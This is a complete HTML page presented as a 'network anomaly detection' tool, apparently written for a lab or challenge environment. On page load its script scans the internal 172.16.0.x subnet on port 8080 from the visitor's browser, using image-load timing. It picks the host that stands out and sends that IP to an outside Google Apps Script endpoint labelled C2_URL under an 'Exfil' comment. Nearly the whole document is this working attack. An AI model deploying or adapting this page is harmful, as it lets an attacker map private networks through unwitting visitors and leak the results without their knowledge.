<!DOCTYPE html>
<html>
<head>
    <title>Anomaly Hunter</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .success { color: #fff; background: #004400; padding: 10px; border: 1px solid #0f0; margin: 10px 0; font-weight: bold;}
        .stat-line { color: #666; font-size: 0.9em; }
        #log { margin-top: 20px; border-top: 1px dashed #333; padding-top: 10px; }
    </style>
</head>
<body>
    <h1>// NETWORK ANOMALY DETECTION //</h1>
    <div id="status">Status: Initializing Probe Sequence...</div>
    <div id="stats" class="stat-line">Baseline Latency: Calculating...</div>
    <div id="results"></div>
    <div id="log"></div>

    <script>
        // --- CONFIGURATION ---
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
        var TARGET_PORT = 8080;
        var SUBNET_PREFIX = "172.16.0.";
        var CONCURRENCY = 32; // Speed optimization (batches of 32)

        // --- STATE ---
        var scanData = []; // Stores {ip, time}
        var activeRequests = 0;
        var queue = [];
        for(var i=1; i<255; i++) queue.push(i);

        // --- UTILS ---
        function getMedian(values) {
            if(values.length === 0) return 0;
            values.sort((a,b) => a-b);
            var half = Math.floor(values.length / 2);
            return values[half];
        }

        function updateAnalysis() {
            // 1. Calculate Baseline (Median)
            var times = scanData.map(d => d.time);
            var median = getMedian(times);
            document.getElementById('stats').innerText = "Current Baseline (Median): " + median + "ms | Scanned: " + scanData.length + "/254";
            return median;
        }

        function finalize() {
            var median = updateAnalysis();
            document.getElementById('status').innerText = "SCAN COMPLETE. ANALYZING DEVIATIONS...";
            
            // 2. Find Outliers (Large Deviation from Median)
            // In your env: Noise = 1000ms, Target = 5ms. Diff = 995ms.
            // We look for anything with > 200ms deviation.
            var outliers = scanData.filter(d => Math.abs(d.time - median) > 200);

            if(outliers.length > 0) {
                var target = outliers[0]; // The most significant outlier
                var msg = "TARGET CONFIRMED: " + target.ip + " (" + target.time + "ms vs Baseline " + median + "ms)";
                
                document.getElementById('results').innerHTML = "<div class='success'>" + msg + "</div>";
                
                // Exfil
                fetch(C2_URL, {
                    method: "POST", 
                    mode: "no-cors",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        type: "ANOMALY_DETECTED",
                        target_ip: target.ip,
                        latency: target.time,
                        baseline: median
                    })
                });
            } else {
                document.getElementById('results').innerText = "No significant anomalies found.";
            }
        }

        function scanIP(ip) {
            return new Promise(resolve => {
                var start = performance.now();
                var img = new Image();
                var hasResolved = false;

                var done = function() {
                    if(hasResolved) return;
                    hasResolved = true;
                    var duration = Math.round(performance.now() - start);
                    scanData.push({ip: ip, time: duration});
                    
                    // Visual Log (Optional, keeps it alive)
                    // document.getElementById('log').innerText = "Scanned " + ip + " : " + duration + "ms";
                    updateAnalysis();
                    resolve();
                };

                img.onload = done;
                img.onerror = done;

                // Timeout matches your env's blackhole behavior (1000ms+)
                setTimeout(function() {
                    if(!hasResolved) {
                        // Force close if it hangs too long
                        img.src = ""; 
                        // Log 1001 to represent timeout
                        scanData.push({ip: ip, time: 1001});
                        hasResolved = true;
                        updateAnalysis();
                        resolve();
                    }
                }, 1000);

                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
            });
        }

        async function processQueue() {
            while(queue.length > 0) {
                var batch = [];
                // Take a batch of IPs
                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
                    var ip = SUBNET_PREFIX + queue.shift();
                    batch.push(scanIP(ip));
                }
                // Wait for batch to finish
                await Promise.all(batch);
            }
            finalize();
        }

        // --- START ---
        processQueue();

    </script>
</body>
</html>
